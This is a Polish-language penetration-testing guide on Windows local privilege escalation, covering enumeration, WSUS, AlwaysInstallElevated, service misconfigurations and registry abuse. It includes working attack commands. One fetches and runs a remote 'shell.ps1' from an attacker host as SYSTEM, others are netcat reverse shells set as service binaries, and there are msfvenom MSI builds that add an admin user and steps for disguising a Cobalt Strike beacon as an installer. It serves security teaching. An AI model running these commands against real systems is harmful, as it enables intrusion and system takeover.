# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Wstępna teoria Windows

### Access Tokens

**Jeśli nie wiesz, czym są Windows Access Tokens, przeczytaj następującą stronę przed kontynuowaniem:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sprawdź następującą stronę, aby uzyskać więcej informacji o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Jeśli nie wiesz, czym są integrity levels w Windows, powinieneś przeczytać następującą stronę przed kontynuowaniem:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

W Windows istnieje kilka mechanizmów, które mogą **uniemożliwić ci enumerację systemu**, uruchamianie plików wykonywalnych lub nawet **wykryć twoje działania**. Powinieneś **przeczytać** następującą **stronę** i **zenumerować** wszystkie te **mechanizmy obronne** przed rozpoczęciem enumeracji privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Procesy UIAccess uruchamiane przez `RAiLaunchAdminProcess` mogą być nadużyte do osiągnięcia High IL bez monitów, gdy sprawdzenia secure-path AppInfo zostaną ominięte. Sprawdź dedykowany UIAccess/Admin Protection bypass workflow tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacja wpisów rejestru dostępności Secure Desktop może być nadużyta do dowolnego zapisu w rejestrze jako SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Informacje o systemie

### Version info enumeration

Sprawdź, czy wersja Windows ma jakieś znane podatności (sprawdź także zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o lukach bezpieczeństwa Microsoftu. Ta baza danych zawiera ponad 4 700 luk bezpieczeństwa, co pokazuje **massive attack surface**, jakie stwarza środowisko Windows.

**Na systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowanego watson)_

**Lokalnie, z informacjami o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria GitHub z exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy jakieś credential/Juicy info są zapisane w zmiennych środowiskowych (env variables)?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkryptów PowerShell

Możesz dowiedzieć się, jak to włączyć, pod adresem [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Szczegóły wykonywań pipeline'ów w PowerShell są rejestrowane, obejmując wykonywane polecenia, wywołania poleceń oraz fragmenty skryptów. Jednak pełne szczegóły wykonania i wyniki wyjściowe mogą nie zostać zarejestrowane.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Pliki transkrypcji" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z logów PowerShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rejestrowany jest pełny zapis aktywności oraz zawartości wykonania skryptu, zapewniając, że każdy blok kodu jest dokumentowany w trakcie działania. Proces ten zachowuje kompleksowy audit trail każdej aktywności, cenny dla forensics oraz analizy zachowań złośliwych. Dokumentując całą aktywność w momencie wykonania, dostarcza szczegółowych informacji o przebiegu procesu.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zdarzenia logowania dla Script Block można znaleźć w Windows Event Viewer pod ścieżką: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić ostatnie 20 zdarzeń możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia Internetu
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz przejąć system, jeśli aktualizacje nie są pobierane przy użyciu http**S**, lecz http.

Zaczynasz od sprawdzenia, czy sieć używa non-SSL WSUS update, uruchamiając poniższe polecenie w cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Lub następujące w PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Wówczas, **jest to możliwe do wykorzystania.** Jeśli ostatni wpis rejestru jest równy 0, wpis WSUS zostanie zignorowany.

Aby wykorzystać te luki możesz użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - to są skrypty-exploity wykorzystujące MiTM do wstrzykiwania 'fałszywych' aktualizacji w ruchu WSUS bez SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Zasadniczo, to jest wada, którą ten błąd wykorzystuje:

> Jeśli mamy możliwość modyfikacji lokalnego proxy użytkownika, a Windows Updates używa proxy skonfigurowanego w ustawieniach Internet Explorera, to mamy także możliwość uruchomienia lokalnie [PyWSUS] w celu przechwycenia własnego ruchu i uruchomienia kodu jako podwyższony użytkownik na naszym hoście.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, będzie też używać jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat samopodpisany dla nazwy hosta WSUS i dodamy ten certyfikat do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwycić zarówno HTTP, jak i HTTPS ruch WSUS. WSUS nie używa mechanizmów podobnych do HSTS do implementacji walidacji typu trust-on-first-use dla certyfikatu. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma poprawną nazwę hosta, zostanie zaakceptowany przez usługę.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Zewnętrzne auto-updatery i Agent IPC (local privesc)

Wiele enterprise agentów wystawia powierzchnię IPC na localhost i uprzywilejowany kanał aktualizacji. Jeśli enrollment można przekierować na serwer atakujący, a updater ufa złośliwemu root CA lub ma słabe sprawdzanie podpisów, lokalny użytkownik może dostarczyć złośliwe MSI, które usługa SYSTEM zainstaluje. Zobacz uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` udostępnia usługę na localhost na **TCP/9401**, która przetwarza komunikaty kontrolowane przez atakującego, pozwalając na wykonywanie dowolnych poleceń jako **NT AUTHORITY\SYSTEM**.

- **Recon**: potwierdź nasłuch i wersję, np. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: umieść PoC takie jak `VeeamHax.exe` z wymaganymi Veeam DLL w tym samym katalogu, a następnie wywołaj payload SYSTEM przez lokalny socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Usługa wykonuje polecenie jako SYSTEM.
## KrbRelayUp

Występuje podatność na **local privilege escalation** w środowiskach Windows **domain** w określonych warunkach. Te warunki obejmują środowiska, w których **LDAP signing is not enforced,** użytkownicy posiadają **self-rights** umożliwiające im skonfigurowanie **Resource-Based Constrained Delegation (RBCD),** oraz możliwość tworzenia komputerów w domenie. Ważne jest, aby zauważyć, że te **wymagania** są spełnione przy użyciu **ustawień domyślnych**.

Znajdź **exploit** w [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Po więcej informacji o przebiegu ataku sprawdź [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Jeśli** te 2 wpisy rejestru są **włączone** (wartość to **0x1**), wtedy użytkownicy o dowolnych uprawnieniach mogą **zainstalować** (wykonać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę, używając modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarkę Windows MSI do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (więc będziesz potrzebować dostępu do GUI):
```
Write-UserAddMSI
```
Wystarczy uruchomić utworzony plik binarny, aby podnieść uprawnienia.

### Opakowanie MSI

Przeczytaj ten samouczek, aby dowiedzieć się, jak stworzyć opakowanie MSI przy użyciu tych narzędzi. Zwróć uwagę, że możesz opakować plik "**.bat**", jeśli **tylko** chcesz **wykonywać** **polecenia**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Utwórz MSI przy użyciu WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Utwórz MSI przy użyciu Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit nowy **Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz "installer" w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, zaznacz **place solution and project in the same directory**, i kliknij **Create**.
- Klikaj dalej **Next** aż dojdziesz do kroku 3 z 4 (choose files to include). Kliknij **Add** i wybierz wygenerowany wcześniej payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
- Istnieją inne właściwości, które możesz zmienić, takie jak **Author** i **Manufacturer**, co może sprawić, że zainstalowana aplikacja będzie wyglądać bardziej wiarygodnie.
- Kliknij prawym przyciskiem na projekt i wybierz **View > Custom Actions**.
- Kliknij prawym na **Install** i wybierz **Add Custom Action**.
- Dwukrotnie kliknij **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. To zapewni, że beacon payload zostanie wykonany natychmiast po uruchomieniu instalatora.
- W **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **build it**.
- Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawisz platformę na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirusy i detektory

### Ustawienia audytu

Te ustawienia decydują o tym, co jest **logowane**, więc należy zwrócić na to uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — warto wiedzieć, dokąd są wysyłane logi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** został zaprojektowany do zarządzania local Administrator passwords, zapewniając, że każde hasło jest unikalne, losowe i regularnie aktualizowane na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą być dostępne tylko dla użytkowników, którym przyznano odpowiednie uprawnienia poprzez ACLs, co pozwala im na przeglądanie local admin passwords, jeśli są do tego uprawnieni.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli aktywny, plain-text passwords są przechowywane w LSASS (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził rozszerzoną ochronę dla Local Security Authority (LSA), aby **zablokować** próby nieufnych procesów mające na celu **read its memory** lub inject code, dodatkowo zabezpieczając system.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest zabezpieczenie credentials przechowywanych na urządzeniu przed zagrożeniami takimi jak pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany security package, zazwyczaj ustanawiane są dla użytkownika domain credentials.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i grupy

### Wylicz użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś grupy uprzywilejowanej, możesz być w stanie eskalować uprawnienia**. Dowiedz się o grupach uprzywilejowanych i jak je nadużyć, aby eskalować uprawnienia tutaj:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się o interesujących tokens** i jak je nadużywać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Katalogi domowe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchomione procesy

### Uprawnienia plików i folderów

Przede wszystkim, wypisując procesy, **sprawdź, czy w linii poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać uruchomiony plik binarny** lub czy masz uprawnienia zapisu do folderu z plikami binarnymi, aby wykorzystać możliwe [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers**, możesz to wykorzystać do eskalacji uprawnień](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień binarek procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów plików binarnych procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Możesz utworzyć memory dump działającego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP mają **credentials in clear text in memory** — spróbuj zrzucić pamięć i odczytać te credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwolić użytkownikowi na uruchomienie CMD lub przeglądanie katalogów.**

Przykład: "Windows Help and Support" (Windows + F1), wyszukaj "command prompt", kliknij "Click to open Command Prompt"

## Usługi

Service Triggers pozwalają Windows uruchomić usługę, gdy zachodzą określone warunki (aktywność named pipe/RPC endpoint, zdarzenia ETW, dostępność IP, pojawienie się urządzenia, odświeżenie GPO itp.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi, wywołując ich triggery. Zobacz techniki enumeracji i aktywacji tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

Uzyskaj listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się posiadanie binarki **accesschk** od _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzić, czy "Authenticated Users" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli występuje ten błąd (na przykład z SSDPSRV):

_Wystąpił błąd systemowy 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma z nią powiązanych włączonych urządzeń._

Możesz ją włączyć za pomocą
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Weź pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Inne obejście** tego problemu to uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki binarnej usługi**

W sytuacji, gdy grupa "Authenticated users" ma przypisane uprawnienie **SERVICE_ALL_ACCESS** do usługi, możliwa jest modyfikacja wykonywalnego pliku tej usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponowne uruchomienie usługi
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia mogą być eskalowane przez różne prawa:

- **SERVICE_CHANGE_CONFIG**: Pozwala na rekonfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia rekonfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usługi.
- **WRITE_OWNER**: Pozwala na przejęcie własności i rekonfigurację uprawnień.
- **GENERIC_WRITE**: Dziedziczy możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również dziedziczy możliwość zmiany konfiguracji usługi.

Do wykrywania i eksploatacji tej luki można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia plików binarnych usług

**Sprawdź, czy możesz zmodyfikować plik binarny wykonywany przez usługę** lub czy masz **uprawnienia do zapisu w katalogu**, w którym znajduje się ten plik binarny ([**DLL Hijacking**](dll-hijacking/index.html)).\
Wszystkie pliki binarne uruchamiane przez usługę możesz uzyskać za pomocą **wmic** (not in system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz także użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Uprawnienia do modyfikacji rejestru usług

Powinieneś sprawdzić, czy możesz modyfikować jakikolwiek rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** względem rejestru **usług**, wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, plik binarny uruchamiany przez usługę można zmodyfikować.

Aby zmienić ścieżkę uruchamianej binarki:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Niektóre funkcje ułatwień dostępu Windows tworzą per-user klucze **ATConfig**, które są później kopiowane przez proces **SYSTEM** do klucza sesji w HKLM. A registry **symbolic link race** może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, dając prymityw umożliwiający arbitralny zapis wartości HKLM.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Uzupełnij wartość **HKCU ATConfig**, którą chcesz, aby zapisał proces **SYSTEM**.
2. Wywołaj kopiowanie na secure-desktop (np. **LockWorkstation**), co uruchamia flow brokera AT.
3. **Wygraj wyścig** przez umieszczenie **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zadziała, zastąp klucz **HKLM Session ATConfig** linkiem rejestru wskazującym na chroniony cel w HKLM.
4. SYSTEM zapisuje wartość wybraną przez atakującego do przekierowanej ścieżki HKLM.

Po uzyskaniu arbitralnego zapisu wartości HKLM, przejdź do LPE przez nadpisanie wartości konfiguracyjnych usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą normalny użytkownik może uruchomić (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** jako część wyścigu.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Uprawnienia AppendData/AddSubdirectory rejestru usług

Jeśli masz to uprawnienie względem rejestru, oznacza to, że **możesz tworzyć podrejestry z tego rejestru**. W przypadku usług Windows jest to **wystarczające do wykonania dowolnego kodu:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Ścieżki usług bez cudzysłowów

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows będzie próbował wykonać każdy fragment kończący się przed spacją.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Wypisz wszystkie unquoted service paths, z wyłączeniem należących do wbudowanych usług Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
